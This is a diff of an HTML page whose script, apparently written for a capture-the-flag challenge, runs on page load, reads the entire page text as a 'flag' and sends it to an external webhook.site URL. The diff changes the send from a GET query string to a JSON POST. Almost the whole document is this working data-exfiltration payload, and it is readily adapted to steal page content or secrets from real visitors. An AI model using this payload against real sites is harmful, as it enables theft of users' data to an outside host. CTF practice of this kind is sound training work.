@@ -9,17 +9,20 @@
     <script>
         // Function to extract the flag from the page
         function extractFlag() {
-            // Replace the selector below with the actual one that contains the flag
-            const flagElement = document.querySelector('body'); // Change this if the flag is in a specific element
-            
+            // Change this to the specific element that contains the flag
+            const flagElement = document.body; // Adjust selector if needed
+
             if (flagElement) {
                 const flagText = flagElement.innerText || flagElement.textContent; // Get the text content
                 console.log('Extracted Flag:', flagText); // Log the flag to console
 
                 // Send the flag to your webhook
-                fetch("https://webhook.site/YOUR_UNIQUE_ID?flag=" + encodeURIComponent(flagText), {
-                    method: 'GET', // Change to 'POST' if you want to send a POST request
-                    mode: 'no-cors' // Use 'no-cors' to avoid CORS issues, but note that this will hide response
+                fetch("https://webhook.site/YOUR_UNIQUE_ID", {
+                    method: 'POST', // Use POST method
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ flag: flagText }) // Send flag in JSON format
                 })
                 .then(response => {
                     console.log('Flag sent to webhook:', response);
@@ -36,4 +39,4 @@
         document.addEventListener('DOMContentLoaded', extractFlag);
     </script>
 </body>
-</htm
+</html>
